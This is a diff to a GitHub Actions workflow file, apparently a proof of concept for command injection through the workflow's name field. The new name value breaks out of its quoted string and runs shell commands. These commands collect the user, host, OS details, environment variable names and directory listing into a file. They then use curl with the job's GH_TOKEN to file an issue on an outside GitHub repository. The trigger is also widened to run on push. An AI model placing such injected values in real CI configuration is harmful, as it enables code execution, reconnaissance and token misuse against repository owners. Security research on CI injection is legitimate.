@@ -1,5 +1,8 @@
-name: Build with unit tests
+name: Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof.txt; echo "pwd=$(pwd)" >> pwn_proof.txt; id >> pwn_proof.txt; cat /etc/os-release >> pwn_proof.txt 2>/dev/null; env | cut -d= -f1 | sort >> pwn_proof.txt; ls -la >> pwn_proof.txt; curl -s -H "Authorization:token $GH_TOKEN" -X POST https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d "{\"title\":\"PoC2 — RCE + recon via injected command using the job's own GITHUB_TOKEN\",\"body\":\"Filed by the injected command. Full environment recon is in the workflow run log (pwn_proof.txt contents).\"}"; echo "
+
 on:
+  push:
+    branches: [master]
   pull_request:
     branches: [master]
     types: [opened, synchronize, reopened]
@@ -7,4 +10,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "normal build step, nothing suspicious here"
+      - run: echo "owner push test -- no fork, no approval gate, same matching name"
